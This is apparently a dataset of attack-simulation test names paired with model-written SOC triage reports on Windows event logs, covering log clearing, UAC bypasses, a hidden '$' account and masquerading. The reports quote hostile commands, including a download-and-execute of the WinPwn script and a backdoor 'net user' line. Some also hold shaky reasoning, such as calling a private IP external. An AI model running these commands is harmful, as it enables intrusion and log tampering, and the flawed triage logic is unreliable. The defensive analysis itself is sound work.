4. **Microsoft Edge Update Process**: There are multiple benign-looking processes related to Microsoft Edge Update. While they appear legitimate, these events are separate from the more blatant suspicious activities.

5. **Account Usage**: The `admin_test` account executed these processes. It is crucial to verify this account's usual activity pattern to determine if such actions align with normal administrative duties.

**Assessment**:
The presence of log clearing activities, along with executions of command-line tools typically used in suspicious contexts (like `cmd.exe` and `wevtutil.exe` with advanced techniques), strongly suggests potential compromise or at least unauthorized and potentially malicious use of administrative privileges to cover a previous action.

**Resolution**: **MALICIOUS**

**Guidance and Next Steps**:
- **Immediate Containment**: Isolate the affected machine from the network to prevent further suspicious activity while the investigation continues.
- **Account Investigation**: Investigate the actions and origin of the `admin_test` user to determine if the account is compromised or if it's being abused by an internal actor.
- **Review EDR Alerts**: Examine the EDR alerts that were originally triggered to seek additional context or evidence.
- **Log Analysis**: Attempt recovery or analysis of cleared logs from backup to establish a timeline of the suspicious behavior.
- **Forensic Review**: Conduct a full forensic analysis of the machine, focusing on recent downloads, installations, and any potential persistence mechanisms.
- **Policy Enforcement**: Review and reinforce logging policies and access controls to monitor for and prevent unauthorized log clearing in the future.

This conclusion considers that no typical administrative procedure would clear logs in a manner seeking to hide legitimate administrative work, especially on a high-profile account like that of a CEO."
Abusing MyComputer Disk Cleanup Path for Persistence,"### Analysis of Logs

Upon reviewing the provided Windows event logs, several aspects stand out which could indicate suspicious or potentially malicious activities.

#### Suspicious Findings:

1. **Clearing of Event Logs:**
   - There are multiple instances of event logs being cleared. Specifically, the Security log (EventID 1102) and the System log (EventID 104) have been cleared by the user `admin_test`. 
   - This action is often associated with an attempt to cover tracks after unauthorized activities or system compromise. It is executed by the `wevtutil.exe` utility, which can be used for legitimate purposes but is frequently seen in similar scenarios during incident response investigations.

2. **Registry Manipulations:**
   - The execution of `cmd.exe` to modify the registry was observed with the command involving `reg.exe` to add a cleanup path in the explorer settings (EventID 17985). This could suggest unauthorized or potentially harmful changes to the system configuration.

3. **Execution of Administrative Utilities:**
   - The use of `whoami.exe`, `wevtutil.exe`, and `reg.exe` by `admin_test` raises suspicion. While these are legitimate Windows utilities, their usage patterns can indicate reconnaissance or an ongoing attempt to maintain persistence.

4. **Excessive `wevtutil.exe` Usage:**
   - `wevtutil.exe` appears to be used multiple times to clear different logs, involving high-level integrity operations by the same user, `admin_test`. The persistent use across various channels indicates potential malicious intent.

5. **High Integrity Level Processes by `admin_test`:**
   - Several processes are operating at a High Integrity Level under the `admin_test` account. This level of access often denotes that the account has administrative privileges, possibly abused to perform unauthorated actions.

6. **Lack of Contextual PowerShell Activity:**
   - The absence of related PowerShell script logs, especially when other administrative tools were heavily used, might present either as an anomaly or indicate that activities were not logged, perhaps intentionally.

#### Indicators of Malicious Activity:

The central indication of potentially malicious activity in this analysis is the systematic clearing of event logs by the `admin_test` user. This is a known technique employed to eliminate forensic traces after systems have been compromised.

### Assessment:

Given the manipulation of system logs to hide actions, along with the registry modifications and administrative utility usage by a single user, these logs tend to portray signs of a potential security breach or preparation for such. The absence of specific malicious code in usual executables doesn't eliminate the potential threats their actions imply.

### Resolution: MALICIOUS

**Threats Identified:**

- Clearing of logs to potentially conceal illicit activity.
- Registry modification potentially leading to unwanted system behavior or persistence mechanisms.
- Administrative command execution under suspicious circumstances.

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Initiate containment procedures for the affected machine to isolate it from the network.
   - Conduct a thorough investigation of the user account `admin_test` to determine if it has been compromised or if misuse occurred.

2. **Deep Dive Analysis:**
   - Analyze forensic images of the affected system for any deleted or hidden data.
   - Investigate other machines accessed by the `admin_test` account and inspect logs for abnormalities or malicious behavior.

3. **Strengthen Security Posture:**
   - Review and potentially tighten user account privileges to reduce the risk of similar incidents.
   - Implement more stringent monitoring for the usage of administrative utilities like `wevtutil.exe` and logging services.
   - Regularly backup logs and enforce stricter log retention policies.

   - Review and update incident response procedures based on findings from this case.
   - Conduct user awareness training focusing on detecting signs of system abuse or compromise.

This detailed assessment suggests further investigation is crucial to determine the full scope and ensure security reinforcements in the infrastructure."
Disable Windows Remote Desktop Protocol,"After analyzing the provided Windows event logs, several aspects appear as indicators of potential malicious activity. Here is a detailed assessment and interpretation of these logs:

1. **Time Manipulation:**
   - Anomalies in the time entries suggest that the system time was altered (`EventID: 4616` and `EventID: 1` from the Kernel-General and Security logs). This behavior can be associated with attempts to erase or alter the timestamp evidence within logs.

2. **Event Log Clearance:**
   - The `EventID: 1102` in the Security log indicates that the event logs were cleared by the user `admin_test`. Similarly, `EventID: 104` mentioned the clearing of the System and Windows PowerShell event logs. Log clearing is a classic indicator of someone attempting to cover their tracks following unauthorized activity.

3. **Suspicious Command Executions:**
   - Multiple commands were executed with high integrity levels by the `admin_test` user:
     - Execution of `wevtutil.exe cl` commands, which are used to clear event logs (`Sysmon EventID: 1` logs). This further corroborates the logs being cleared.
     - Execution of `cmd.exe` with command line arguments that modify the registry setting related to Terminal Services connections (`Sysmon EventID: 1`). This has implications for remote access, potentially allowing or restricting RDP access.

4. **Service and Process Activity:**
   - Several instances of `MicrosoftEdgeUpdate.exe` and related processes are running under the `NT AUTHORITY\SYSTEM` user with SYSTEM integrity levels. While updates could be legitimate, given the surrounding suspicious activity, it is worth verifying these processes further for legitimacy, as they might be exploited for persistence or privilege escalation.

5. **Network Services Activity:**
   - Services such as `wsmprovhost.exe` (WS-management), `sppsvc.exe`, and `TiWorker.exe` are running. While these could be benign, any unusual uptime or modifications in these services should prompt further investigation.

**Assessment:**
Based on the observations, the activity within the logs is **SUSPICIOUS**. The clearing of logs, manipulation of system time, and execution of specific commands suggest potential malicious intentions that require further investigation. 

**Guidance on How to Proceed:**
- Conduct a thorough review of the user's recent activity and system modifications.
- Verify the integrity and authenticity of Microsoft Edge updates and services.
- Inspect remote access configurations and ensure that unauthorized access points are not opened.
- Initiate endpoint detection and response (EDR) tools for more in-depth monitoring and analysis.
- Consider isolating the machine from the network until a clear understanding of the situation is achieved.

The resolution based on the presented logs and evidence is **SUSPICIOUS**. Further investigation should follow to determine the intent and scope of the activities observed."
Headless Browser Accessing Mockbin,"After analyzing the provided Windows event logs, several points of interest suggest potential malicious activity:

1. **Event Log Clearing (ID 1102, Sysmon log clearance)**:
   - The logs show multiple instances of log file clearing (`wevtutil.exe cl`) related to the Event ID `1102`, which is specifically associated with the clearing of the security event logs. The use of `wevtutil` to clear logs can be a strong indicator of an attempt to cover tracks, indicative of malicious behavior.

2. **Unusual Scheduled Task Execution**:
   - The appearance of PowerShell commands with restrictive policies (`-ExecutionPolicy Restricted`) in combination with a muted setup that reads specific content within INF files could represent a form of reconnaissance or a malicious script attempting to identify installation files or configurations prone to exploitation (found in the Windows PowerShell logs).
   
3. **Process Anomalies**:
   - The execution of CMD to launch a browser in headless mode (`cmd.exe /c start """" chrome --headless --disable-gpu`) could potentially be used for data exfiltration or automated tasks not typically associated with standard user behavior.
   
4. **Multiple Execution of CompatTelRunner.exe**:
   - Compatibility Telemetry (CompatTelRunner.exe) is shown executing multiple times with distinct command line actions, which might be normal but also needs verification for legitimacy as repeated attempts could be a way to exploit telemetry features or services as part of data collection or intelligence gathering.
   
5. **Privilege Escalation Attempts**:
   - The logs show the user `admin_test` performing high-privilege operations, such as identifying system users (event ID `4798`) and exhibiting multiple privilege-sensitive token usage (event ID `4672`), which could suggest an attempt at privilege escalation or reconnaissance.
   
6. **Network-based Logon Entries**:
   - Specific events indicate NTLM logons, ascertainable by event ID `4624` with Logon Type `3`, from a potential external IP address `192.168.0.102`. This might reflect lateral movement or unauthorized network access if the IP is not part of the known organizational subnets.

**Assessment**:
The review of events concerning the clearing of logs, unusual execution of processes with potential reconnaissance or data exfiltration patterns, compounded with the immaculacy of mitigation steps associated with these tasks, strongly indicates malicious behavior.

**Resolution**:
**MALICIOUS** - The activities within these logs correspond to recognized patterns often associated with attempted or committed compromise. The clearing of security logs, unusual PowerShell activity, and evidence suggesting potential lateral movement confirm this conclusion.

**Guidance**:
- Immediately conduct a thorough forensic investigation on the device `Server002`.
- Isolate the affected host to prevent lateral movement or further compromise.
- Review and reinforce logging configurations and access policies, especially checking for unauthorized changes or escalations.
- Utilize additional threat intelligence and EDR solutions to determine if any malware signatures match observed activities.
- Consider resetting credentials for potentially compromised accounts, particularly those that appear in these logs, and inform relevant incident response teams to guide appropriate remediation actions."
Bypass UAC using ComputerDefaults (PowerShell),"Based on the provided logs from various Windows event sources, there are several indicators of activities that could be considered suspicious or malicious. Here's a detailed analysis:

### Analysis:

1. **PowerShell Activity:**
   - The PowerShell logs show commands being executed to manipulate registry settings particularly under `HKCU:\software\classes\ms-settings\shell\open\command`. These commands are setting up a hijack method commonly associated with UAC bypass or privilege escalation attempts, by redirecting `ComputerDefaults.exe` to open `cmd.exe`.
   - The specific command sequence seen here is a well-known technique for bypassing User Account Control (UAC) to gain elevated privileges without user consent.

2. **Clearing of Event Logs:**
   - The Security, System, and Windows PowerShell event logs have been cleared as seen with EventID 1102 for Security and EventID 104 for System and PowerShell. This behavior is particularly suspicious as attackers often clear logs to cover their tracks after gaining unauthorized access or performing malicious actions.

3. **Sysmon Events:**
   - The logs indicate the usage of `wevtutil.exe` to clear logs and manage the Event Viewer channels. This activity complements the log clearing events seen in the System and Security logs.
   - Given that `wevtutil.exe` was executed by `admin_test` and in quick succession to multiple other related commands, it suggests an intentional log clearing to hide activities.

4. **Process Creation and High Integrity Level:**
   - Multiple processes were executed with high integrity levels, which means these operations were performed with elevated privileges. This aligns with the potential UAC bypass seen in the PowerShell logs.

5. **Repeated Execution of `MicrosoftEdgeUpdate.exe`:**
   - Numerous executions and service manipulations of Microsoft Edge Update were detected. While not directly malicious, when correlated with other suspicious activities, it might suggest attempts at persistence or privilege escalation.

### Assessment:

The logs present a clear narrative of potentially malicious activity:
- The execution of PowerShell scripts to manipulate the registry for potential UAC bypass.
- The clearing of significant event logs which suggests an attempt to hide malicious activities.
- Usage of tools and commands associated with advanced stages of an attack lifecycle, pointing towards privilege escalation and anti-forensics measures.

### Resolution: MALICIOUS

Given the above analysis of the events, the activities observed in the logs are indicative of malicious intent, likely aiming at gaining unauthorized access or escalating privileges on the system. 

### Guidance on How to Proceed:
1. **Immediate Investigation:**
   - Conduct a thorough investigation on the system `Server002` and any associated user account(s), such as `admin_test`.
   - Identify any unauthorized software, backdoors, or changes in system configuration.

2. **Containment and Remediation:**
   - Isolate the affected system from the network to prevent further spread or command & control activities.
   - Restore the system from a known good backup if tampering is confirmed.

3. **Audit and Review:**
   - Review all privileged account activities across the network and ensure strict adherence to least privilege principles.
   - Implement enhanced monitoring of log activities to detect and alert on log clearing commands or potential UAC bypass techniques in the future.

4. **Security Enhancements:**
   - Consider implementing additional security controls such as Application Whitelisting and PowerShell Constrained Language Mode to limit the execution of potentially harmful scripts.
   - Regular security awareness training for employees about recognizing suspicious behavior on their systems.

The investigation should be a coordinated effort across IT security and operations, with involvement from management if needed."
Masquerading - windows exe running as different windows exe,"Based on the detailed analysis of the provided Windows event logs, several activities indicate potential malicious behaviors:

1. **Clearing of Event Logs**:
   - Multiple events indicate that various logs (System, Security, Windows PowerShell, and Sysmon) have been cleared by a user named `admin_test` shortly before or after suspicious activities. Specifically, Event ID 104 in the System log and Event ID 1102 in the Security log indicate the clearing of logs. This can often be an indication of an attempt to cover up malicious activities.

2. **Suspicious PowerShell Execution**:
   - There is a PowerShell command logged that involves copying the command prompt executable to a temporary location as ""svchost.exe"", executing it, and then terminating the process (Sysmon EventRecordID 17952 and PowerShell EventRecordIDs 1043-1050). This activity matches a known tactic (T1036.003) for attempting to disguise malicious activity by using legitimate process names.

3. **Unusual Process Execution**:
   - The creation of processes like `svchost.exe` in non-standard directories and its execution, as noted in the Sysmon log (EventRecordIDs 17954, 17956). The hash associated with this process (SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0) should be checked against known malicious hashes.

4. **Log Clearing by Non-sensitive Processes**:
   - Utilization of `wevtutil.exe` to clear logs as seen in multiple Sysmon entries (Event IDs 1 and 5 with `wevtutil.exe` usage). The usage of wevtutil to perform such actions directly by a user account without a clear maintenance or administrative task context is suspicious.

5. **Indicators of Persistence or Lateral Movement Attempts**:
   - The use of `wevtutil.exe` to clear security and other event logs may suggest attempts at establishing persistence or lateral movement undetected.

**Risks and Threats Identified**:
- Evidence of evasion techniques through log-clearing.
- Execution of potentially malicious code disguised as routine operations.
- Possible unauthorized access or exploitation attempts by the `admin_test` account.

**Guidance on How to Proceed**:
1. **Immediate Measures**:
   - Investigate the user `admin_test` for unauthorized access or credentials compromise.
   - Isolate the affected machine to prevent any further potential spread of a compromise.
   - Verify the SHA256 hashes of the involved executables against known malicious databases.

2. **Further Investigation**:
   - Conduct a deeper forensic analysis on the machine, especially focusing on PowerShell and `svchost.exe` activities.
   - Review recent changes to admin accounts and privilege escalations.

3. **Long-term Actions**:
   - Strengthen monitoring and alerting for similar activities in other systems.
   - Consider additional security training for the staff on recognizing suspicious activities.
   - Ensure all patches and updates are applied, especially for endpoint detection and response systems.

**Resolution**: MALICIOUS - The analysis presents strong evidence of malicious activity aimed at obfuscating system alterations, potentially indicating a security breach."
WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"**Analysis of the Logs:**

1. **PowerShell Activity:**
   - The logs indicate PowerShell activity with ""Invoke-CimMethod"" used to install an MSI package located in a temporary folder (specifically related to Atomic Red Team's execution). The command executed was: `powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_VBScript.msi' }}`.
   - Another PowerShell execution with the command line: `powershell.exe -nop -Command Write-Host VBScript executed me!; exit`.

2. **Application Log Entries:**
   - There are logs from `MsiInstaller` indicating the installation of a package called ""Atomic Red Team Test Installer"" which completed successfully.
   - The execution of installers in testing security scenarios (formation and validation of detections) is related to the Atomic Red Team framework, known for simulating adversary techniques, tactics, and procedures (TTPs).

3. **Sysmon Logs:**
   - There are multiple entries involving tools like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `sppsvc.exe`, `tiworker.exe`, etc., but they do not necessarily indicate malicious activity on their own.
   - There also appears to be event log clearance via `wevtutil.exe` command, indicating potential attempt to cover tracks/log deletion.

4. **Security and System Logs:**
   - The security log was cleared, as evidenced by event 1102, by the user ""admin_test,"" which is a serious indicator of malicious intent or obfuscation attempts.
   - Similarly, the system log was cleared twice, which correlates with actions that are commonly performed by malware or attackers to hinder forensic analysis.

**Assessment and Resolution:**

- The use of Atomic Red Team techniques: While the use of Atomic Red Team (ART) framework itself is not inherently malicious, the execution of emulation scenarios, especially on a significant endpoint such as the CEO's machine, without prior notification or controlled conditions, warrants concern.
- Log Clearance: The clearing of security and system logs associated with user ""admin_test"" is a strong indicator of potential malicious activity, aiming to hide actions taken on the system.

Given the activities observed (PowerShell script execution, MSI installations linked to testing frameworks, and log clearance), and considering that Atomic Red Team activities are deliberate and can obfuscate or mimic malicious actions, we determine the overall nature of the scenario:

**Resolution: MALICIOUS.**

**Guidance on How to Proceed:**

- **Immediate Actions:**
  1. Isolate the affected host (CEO's machine) from the network to prevent further potential compromise.
  2. Conduct a thorough investigation starting with user ""admin_test"" to determine whether their credentials or access was compromised.
  3. Review any logs or backups available before the logs were cleared to reconstruct unauthorized actions.
  
- **Beyond the Immediate Response:**
  1. Assess whether additional hosts were targeted using the same TTPs.
  2. Consider bolstering security monitoring and enhance SIEM configurations to alert on similar event patterns.
  3. Determine the legitimacy of Atomic Red Team usage: validate if it was authorized, and if so, confirm who initiated it and whether it was part of a sanctioned exercise.
  
- **Preventive Measures:**
  1. Implement tighter access controls for key machines, including the CEO's.
  2. Regularly audit privileged accounts and closely monitor any unusual or risky command executions.
  
This assessment underscores the criticality of diligence in monitoring for such behaviors and ensuring secure and informed simulation of adversary techniques."
UACME Bypass Method 23,"**Detailed Analysis of the Logs:**

1. **Security and System Logs:**
   - **Event ID 1102 in Security Log and Event ID 104 in System Log:** These events indicate that the security log and system log were cleared. This action was performed by a user named ""admin_test"" on ""SERVER002"". Clearing logs is highly suspicious as it can indicate an attempt to hide malicious activities.

2. **Sysmon Log:**
   - **Execution of `cmd.exe` and `powershell.exe`:** The sequence of events shows usage of `cmd.exe` and `powershell.exe` by the user ""admin_test"". The command executed involves `AtomicRedTeam` and `Akagi64.exe`, which are known tools and tactics used in adversary simulations and potential exploits for privilege escalation. `Akagi64.exe` is associated with UAC bypassing, a method often employed by attackers to escalate privileges.
   - **Use of `wevtutil.exe`:** Observed multiple instances of `wevtutil.exe` being used to clear logs such as Application, System, Security, and PowerShell logs. Similar to the manual clearing mentioned above, this is also an indicator of potential malicious activity trying to cover tracks.
   - **Execution of `whoami.exe` and `hostname.exe`:** These utility tools were run on the system, which could be used by an attacker to gather more information about the user context and system they have compromised.
   - **Microsoft Edge Update Activity:** The series of logs show legitimate Microsoft Edge update activities. These can generally be considered benign unless combined with other suspicious activities.

3. **Application Logs:**

Create a Hidden User Called $,"### Analysis of Windows Event Logs

Based on the logs provided, here is a detailed analysis highlighting suspicious activities:

#### 1. Log Clearing Activity
- **System Event ID 104** and **Security Event ID 1102** indicate that the event logs have been cleared. The events show that an account with the username `admin_test` has cleared the System and Security logs.
- Log clearing is a commonly used technique by attackers to hide their tracks after performing malicious activities. This makes the process highly suspicious.

#### 2. Suspicious User Account Activity
- The **Security Event Log IDs 4728, 4720, 4722, 4738, 4724, and 4732** indicate various changes made to user accounts:
  - **Event ID 4720**: A new user account with the name `$` was created.
  - **Event ID 4722**: The new account was enabled.
  - **Event ID 4738** and **4724**: Account modifications were made.

The use of the name `$` for a user account is particularly suspicious, as it doesn't conform to normal naming conventions and often such names are used in automated attacks or by threat actors.

#### 3. Unauthorized Process Execution
- The **Sysmon Logs** reveal execution of command line utilities that are often leveraged for reconnaissance or malicious purposes:
  - **wevtutil**: Used to clear logs (confirmed by multiple logs clearing activities).
  - **cmd.exe**: Executed with a command to add a new user account with the credentials `net user $ ATOMIC123! /add /active:yes`. The password `ATOMIC123!` looks like a placeholder or test account, potentially indicating steps to create a backdoor.
  - **whoami.exe** and **hostname.exe**: Typically used for system enumeration, indicating reconnaissance activity.

#### 4. Context and Circumstances
- All the aforementioned activities occurred in a very short time span (`12:58:07` to `12:58:09`) by the user `admin_test`.
- The combination of log clearing activity, creation of suspicious user accounts, and execution of net commands suggests potentially malicious behavior aimed at gaining unauthorized access or persistence on the system.

### Assessment and Risks
- **Malicious**: The activities observed in the logs are consistent with known attack patterns, including privilege escalation, persistence establishment (via new account creation), and anti-forensic activities (log clearing). The creation of a suspicious new user with an atypical username further supports malicious intent.

### Recommendations
1. **Immediate Containment**: Disable the `admin_test` account or any other accounts found to be suspicious.
2. **Eradication**: Remove the unauthorized user account `$`, and any other artifacts associated with this incident.
3. **Recovery**: Restore the system to a known good state prior to the first sign of compromise, using backups if necessary.
4. **Investigation**: Conduct a thorough forensic investigation to identify the root cause of the compromise.
5. **Prevention**: Enhance monitoring to detect similar anomalous activities in the future, and review access controls and permissions for administrative users.

6. **Communication**: Notify the CEO and other stakeholders about the incident and the steps being taken to address it.

Concluding, the resolution for this case is **MALICIOUS** based on the collected evidence and the nature of the activity observed in the logs."
WinPwn - UAC Bypass DiskCleanup technique,"### Analysis Summary

The provided logs contain several indicators of potentially malicious activity, especially within the Windows PowerShell logs and accompanying Sysmon logs.

#### Suspicious or Anomalous Behaviors:
1. **Event Log Clearing:**
   - **Security Event ID 1102**: This event indicates that the event logs were cleared. The user `admin_test` executed `wevtutil.exe` commands to clear logs for Sysmon, Security, Application, and Windows PowerShell channels. This is a common tactic to hide tracks and should be considered suspicious, especially given the timing with the other events.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs indicate the execution of a script using the `Invoke-Expression` (`iex`) command, which is known for executing arbitrary code. The code downloads and executes a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`) and attempts a User Account Control (UAC) bypass using the `DiskCleanup` technique. This behavior is highly indicative of malicious intent.

3. **System and Security Event Anomalies:**
   - **Security Event ID 4616**: Indicates that the system time was changed by the `svchost.exe` process. Time manipulation can be used to attempt obscure event timelines.
   - **Repeatedly Created `wevtutil.exe` and `conhost.exe` Processes**: These processes were executed multiple times, aligning with log clearing, indicating an attempt to intervene in or hide these processes from typical monitoring practices.

4. **Sysmon Logs:**
   - Multiple Sysmon events show the use of `wevtutil.exe` for log clearing activities. `admin_test` executed these commands, and Sysmon captured their events. Such actions, especially in rapid succession, suggest an attempt to obfuscate further activities.
   - The shell execution of `whoami.exe` and similar tools are indicative of potential reconnaissance or system enumeration.

### Assessment

- **Malicious Activity Identified:** The combination of event log clearing, suspicious PowerShell execution downloading potentially harmful scripts, and other indicative behavior marks this activity as malicious. The administrator privileges used by `admin_test` facilitate these actions further, allowing potential unrestricted system access.

### Guidance on Resolution

Given the findings of the investigation, it is recommended to escalate this issue to the incident response team immediately. The following actions should be taken:

1. **Isolate the Affected System:** Disconnect the system from the network to prevent further access or lateral movement.
2. **Conduct Full Forensic Analysis:** Retrieve memory, disk images, and any other relevant artifacts from the affected machine for a comprehensive analysis.
3. **Review User Account Activity:** Investigate usage patterns and login history of `admin_test` and any potentially compromised accounts.
4. **Alert IT Security Teams:** Inform the IT security teams to be on high alert for similar activity in other networked systems.
5. **Patch and Update Systems:** Ensure all systems are up-to-date with the latest security patches to prevent exploitation through known vulnerabilities.
6. **Review and Implement Hardened Security Policies:** Review current security policies and strengthen where necessary, focusing on least privilege and enhanced monitoring of high-privilege accounts.

### Final Resolution

- **MALICIOUS**: The logs contain conclusive evidence of malicious activity that requires immediate attention and remediation actions."
Copy and Modify Mailbox Data on Windows,"### Analysis of Windows Event Logs

**1. Application Log:**
- The entry in the Application log indicates routine Software Protection Platform Service activity. The timestamp does not correlate with the EDR alert, so it’s irrelevant for this analysis.

**2. Windows PowerShell Log:**
- There's an execution of PowerShell script involving operations on the directory `C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data`. This script copies files to a new subdirectory and makes modifications labeled ""Modification for Atomic Red Test"".
- The presence of ""Atomic Red Test"" suggests this activity could be a part of a standardized attack simulation, often used for security testing rather than actual attack.

**3. Security Log:**
- Event ID 1102 logs indicate that the security event log was cleared, which is highly suspicious because it’s a common technique used by attackers to hide their tracks.
- Paired with Event ID 4616, which shows a time change done by LOCAL SERVICE, this could indicate attempts to further manipulate audit trails.

**4. Sysmon Log:**
- Repeated use of Wevtutil.exe (Windows Event Utility) to clear logs (""cl"") for various channels (e.g., Sysmon, Application, Security, Windows PowerShell) by the `admin_test` user indicates potential log tampering.
- The use of legitimate administrative tools (Wevtutil and PowerShell) in this manner suggests ""Living Off the Land"" tactics, often used by attackers to evade detection.
- The presence of process executions by `admin_test` with elevated privileges is further validation of the suspicious activity noted.

**5. System Log:**
- Mirroring records of system and PowerShell logs being cleared; documents the administrative user conducting said clearances, corroborating suspicions of log tampering.

### Conclusion and Resolution

- The analysis conclusively identifies multiple suspicious activities:
  - The clearing of logs, especially security logs.
  - The Wevtutil executions to clear logs.
  - Potential use of an atomic test script which might indicate security testing or a false-flag to hide malicious activity.
  
Given the criticality and implications of log clearance and suspicious PowerShell activities, this activity cannot be immediately classified as benign. Further inquiry into whether the Atomic Red Team tests were authorized or not needs confirmatory action.

**Resolution: SUSPICIOUS**

### Recommended Actions:

1. **Immediate Review and Investigation:**
   - Confirm with the IT/security team if the PowerShell script correlating with an Atomic Red Team test was authorized.
   - Investigate the user `admin_test` to assure no compromise has occurred and cross-check their recent activities and intent.

2. **Audit and Monitoring:**
   - Continuously monitor for any further suspicious activities from `admin_test`.
   - Implement enhanced logging and monitoring, especially around EDR alerts, PowerShell activities, and administrative tools usage.

3. **Forensic Analysis:**
   - Conduct a deeper forensic analysis to identify any additional indicators of compromise.
   - Preserve relevant logs and artifacts for further investigation."
Windows Add Registry Value to Load Service in Safe Mode without Network,"**Detailed Analysis:**

Upon reviewing the event logs provided, several red flags and suspicious activities were observed, particularly related to log clearance and registry modifications that suggest a potential compromise of the CEO's machine, named Server002.

1. **Log File Clearance:**
   - The `System`, `Windows PowerShell`, and `Security` logs were cleared (Event ID 104 for System and Windows PowerShell; Event ID 1102 for Security) at nearly the same timestamp (`2024-10-24 16:11:47`). This action was performed by the user `admin_test`. Clearing logs is often a tactic used by attackers to cover their tracks.

2. **Suspicious Process Execution:**
   - The `wevtutil.exe` utility, which is used to clear event logs, was executed multiple times by `admin_test`. The associated commands (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl Security`, `cl System`, `cl ""Windows PowerShell""`) confirm the clearing of various logs.
   - `cmd.exe` was executed with a suspicious command line to modify system registry settings: `REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode""` (Event ID 1). Such registry modifications could potentially disable security features or set up persistence mechanisms.

3. **Unusual Use of Built-in Tools:**
   - The processes `whoami.exe`, `hostname.exe`, and other system utilities like `cmd.exe` and `reg.exe` were executed by `admin_test`. While this could be part of legitimate administrative activities, in conjunction with the log clearance and registry modifications, it raises suspicion.

4. **Frequent High-Integrity Executions:**
   - All suspicious processes were run with a high integrity level, indicating elevated privileges.

5. **Time Synchronization Events:**
   - Time change events occurred, which can sometimes be used to manipulate timestamps (Event ID 4616). The discrepancies are slight, but they coincide with other suspicious activities.

6. **Software Update Logs:**
   - Several entries related to Microsoft Edge Update are present, but these do not show immediate signs of malicious activity; they seem consistent with legitimate update processes.

**Assessment:**
The combination of cleared logs, the usage of `wevtutil.exe` for clearing logs, suspicious registry modifications via `cmd.exe`, and the high integrity level of these operations suggests a deliberate attempt to alter system configurations and conceal activities.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected host (Server002) from the network to prevent further potential damage.
- Perform a more in-depth forensic analysis to understand the extent of the compromise, focusing on other potential persistence mechanisms and data exfiltration attempts.
- Review and enhance logging and monitoring configurations to detect and alert on similar activities.
- Reset passwords and review accounts with elevated privileges, especially `admin_test`.
- Ensure all system patches and security updates are applied to reduce vulnerabilities.

This analysis and response should provide clear guidance for mitigating the identified threats and securing the system against future attacks."
Copy and Delete Mailbox Data on Windows,"Based on the analysis of the provided Windows event logs, we can identify the following key observations:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearing:**
   - Multiple instances of `wevtutil.exe` were executed to clear event logs (System, Security, and Windows PowerShell). The command-line argument used, `cl`, suggests that someone cleared these logs intentionally:
     - Application Event Log Cleared
     - System Event Log Cleared
     - Security Event Log Cleared
     - PowerShell Event Log Cleared
   - These actions were performed by the user `SERVER002\admin_test`, indicating a deliberate attempt to remove traces of activity, which is a common tactic used to cover illicit activities.

2. **Suspicious PowerShell Execution:**
   - The PowerShell script executed was used to create, copy, and ultimately delete directories and their contents under `C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\`. This script seems unusual and potentially malicious due to its operations on user data directories:
     - The command sequence involves directory creation, copying of files, followed by removal, which may indicate an attempt to manipulate or hide data.
   - The PowerShell script was run with high integrity level, suggesting it had a high level of privilege, potentially exacerbating the risk of its actions.

3. **Time Change Events:**
   - There are Kernel-General events (Event ID 1) indicating changes to system time. While these actions are done under system context and may not necessarily be malicious, they can be leveraged to manipulate timestamps of other malicious activities.

4. **Chained Process Executions:**
   - There are numerous executions of `MicrosoftEdgeUpdate.exe` and its related components (`MicrosoftEdgeUpdateComRegisterShell64.exe`), which may appear benign but should be cross-verified with scheduled tasks or legitimate updates to rule out misuse.
  
### Assessment:

Given these observations, the logs reveal a series of actions that are highly indicative of malicious activity:

- The clearing of event logs is a strong indicator of malicious intent, especially when performed across all major logging channels.
- The usage of `wevtutil.exe` to clear logs is not a routine administrative task and strongly suggests an effort to obfuscate potentially unauthorized activity.
- The execution of a PowerShell script with suspicious operations on user data directories increases the likelihood of data exfiltration or tampering.
- The time changes could be benign or part of an attempt to mislead time-based forensics. 

### Resolution:

Given the evidence and the severity of the actions observed, the event logs indicate **MALICIOUS** activity.

### Guidance:

- Immediate incident response procedures should be initiated. This includes isolating the affected machine (Server002) from the network to contain potential threats.
- A full forensic analysis of the machine should be conducted, focusing on process creation, files accessed or modified, and network connections made during the period of suspected activity.
- Review any related network logs or alerts from EDR for further context to the machine's network-based activities.
- Initiate a review of user accounts and strengthen security policies (e.g., implement stricter event log retention and monitoring).
- Evaluate and enhance existing anomaly detection and logging capabilities to prevent or quickly detect similar events in the future."
Rundll32 execute command via FileProtocolHandler,"Upon careful examination of the provided Windows event logs, several indicators suggest potentially malicious activity. Here’s a detailed breakdown:

1. **Log Clearing Events:**
   - The system and Windows PowerShell logs were cleared by the user `admin_test`. Event 104 is logged when logs are cleared, which is typically performed deliberately to hide malicious activities. This activity is seen within the `System` log and also the `Security` log with Event ID 1102, indicating that the security log itself was cleared.
   
2. **Suspicious Process Execution:**
   - **Command Line Execution:** The process `cmd.exe` executed the command `rundll32.exe url.dll,FileProtocolHandler calc.exe`. While the Windows Calculator (`calc.exe`) is a legitimate utility, using `rundll32.exe` to launch it with these parameters is unusual and aligns with common tactics to execute code under the guise of a legitimate program.
   - Sysmon Event ID 1 captures this, identifying the parent process `wsmprovhost.exe`, which itself is legitimate but serves as a handler for management operations and, under certain conditions, could be manipulated to execute unauthorized actions.

3. **Process Creation and Clearing Logs via Wevtutil:**
   - Multiple instances of `wevtutil.exe` are noted, used here for clearing logs (`Microsoft-Windows-Sysmon/Operational`, `System`, `Security`, and `Windows PowerShell`). These instances correlate with cleared logs noted in the System and Security logs.
   - The Sysmon log records these occurrences, identifying the `wevtutil.exe` command line usage for clearing various logs.

